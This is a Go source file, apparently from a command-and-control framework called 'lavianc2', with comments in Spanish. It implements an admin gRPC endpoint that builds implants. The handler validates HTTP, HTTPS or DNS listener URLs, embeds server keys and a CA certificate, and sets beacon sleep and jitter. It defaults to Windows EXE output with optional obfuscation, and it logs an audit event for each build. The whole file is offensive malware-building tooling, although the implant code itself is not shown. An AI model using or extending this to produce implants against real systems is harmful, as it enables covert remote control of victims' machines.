package api

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"os"
	"strings"
	"time"

	adminv1 "github.com/uLl0a/lavianc2/gen/admin/v1"
	"github.com/uLl0a/lavianc2/internal/builder"
	"github.com/uLl0a/lavianc2/internal/models"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

func (s *adminService) BuildImplant(
	ctx context.Context,
	req *adminv1.BuildImplantRequest,
) (*adminv1.BuildImplantResponse, error) {
	if req.ListenerUrl == "" || req.ProfileName == "" {
		return nil, status.Error(codes.InvalidArgument, "listener_url y profile_name requeridos")
	}
	if s.serverKeys == nil {
		return nil, status.Error(codes.FailedPrecondition, "server keys no inicializadas")
	}

	// Validar listener URL.
	if err := validateListenerURL(req.ListenerUrl); err != nil {
		return nil, status.Errorf(codes.InvalidArgument, "listener_url inválida: %v", err)
	}

	u, err := url.Parse(req.ListenerUrl)
	if err != nil || u.Scheme == "" {
		return nil, status.Errorf(codes.InvalidArgument, "listener_url inválida: %v", err)
	}

	switch u.Scheme {
	case "http", "https":
		if _, err := s.profiles.Get(req.ProfileName); err != nil {
			return nil, status.Errorf(codes.InvalidArgument,
				"perfil HTTP %q no encontrado: %v", req.ProfileName, err)
		}
	case "dns":
		if _, err := s.dnsProfiles.Get(req.ProfileName); err != nil {
			return nil, status.Errorf(codes.InvalidArgument,
				"perfil DNS %q no encontrado: %v", req.ProfileName, err)
		}
	default:
		return nil, status.Errorf(codes.InvalidArgument,
			"esquema %q no soportado (usa http://, https:// o dns://)", u.Scheme)
	}

	caPEM, err := os.ReadFile(s.caFile)
	if err != nil {
		return nil, status.Errorf(codes.FailedPrecondition, "no se pudo leer CA: %v", err)
	}
	caB64 := base64.StdEncoding.EncodeToString(caPEM)

	cfg := &builder.BuildConfig{
		TargetOS:        builder.TargetOS(req.TargetOs),
		TargetArch:      builder.TargetArch(req.TargetArch),
		Format:          builder.OutputFormat(req.Format),
		ListenerURL:     req.ListenerUrl,
		ProfileName:     req.ProfileName,
		ServerPubKey:    s.serverKeys.PublicKeyBase64(),
		CACertPEMBase64: caB64,
		SleepSecs:       int(req.SleepSecs),
		JitterPerc:      int(req.JitterPerc),
		Obfuscate:       req.Obfuscate,
		Compress:        req.Compress,
		CreatedAt:       time.Now().UTC(),
	}

	// Defaults.
	if cfg.SleepSecs == 0 {
		cfg.SleepSecs = 60
	}
	if cfg.JitterPerc == 0 {
		cfg.JitterPerc = 10
	}
	if cfg.TargetOS == "" {
		cfg.TargetOS = builder.TargetWindows
	}
	if cfg.TargetArch == "" {
		cfg.TargetArch = builder.ArchAMD64
	}
	if cfg.Format == "" {
		cfg.Format = builder.FormatEXE
	}

	// Compilar.
	b := builder.NewBuilder(s.repoRoot)
	result, err := b.BuildWithResult(cfg)
	if err != nil {
		return nil, status.Errorf(codes.Internal, "build falló: %v", err)
	}

	s.recordBuildAudit(ctx, req, result)

	return &adminv1.BuildImplantResponse{
		BuildId:    result.BuildID,
		OutputPath: result.OutputPath,
		SizeBytes:  result.SizeBytes,
		DurationMs: result.Duration.Milliseconds(),
	}, nil
}

func (s *adminService) recordBuildAudit(
	ctx context.Context,
	req *adminv1.BuildImplantRequest,
	result *builder.BuildResult,
) {
	opID := operatorIDFromContext(ctx)

	ev := &models.Event{
		Level:    models.LevelInfo,
		Category: "build",
		Message:  "implante compilado",
		Data: map[string]any{
			"build_id":     result.BuildID,
			"profile":      req.ProfileName,
			"target_os":    req.TargetOs,
			"target_arch":  req.TargetArch,
			"format":       req.Format,
			"listener_url": req.ListenerUrl,
			"output_path":  result.OutputPath,
			"size_bytes":   result.SizeBytes,
			"duration_ms":  result.Duration.Milliseconds(),
		},
		CreatedAt: time.Now().UTC(),
	}
	if opID.String() != "00000000-0000-0000-0000-000000000000" {
		ev.OperatorID = &opID
	}
	if err := s.store.Events.Create(ctx, ev); err != nil {
		// No abortamos: el build ya se hizo, esto es solo auditoría.
		// En producción, aquí iría un log a un sistema de alertas.
		_ = err
	}
}

func validateListenerURL(raw string) error {
	u, err := url.Parse(raw)
	if err != nil {
		return fmt.Errorf("URL no parseable: %w", err)
	}
	switch u.Scheme {
	case "http", "https":
		if u.Host == "" {
			return errors.New("falta host")
		}
	case "dns":
		if u.Host == "" {
			return errors.New("falta host (ej: dns://1.2.3.4:53)")
		}
		if !strings.Contains(u.Host, ":") {
			return errors.New("DNS requiere puerto explícito (ej: dns://1.2.3.4:53)")
		}
	default:
		return fmt.Errorf("esquema %q no soportado", u.Scheme)
	}
	return nil
}
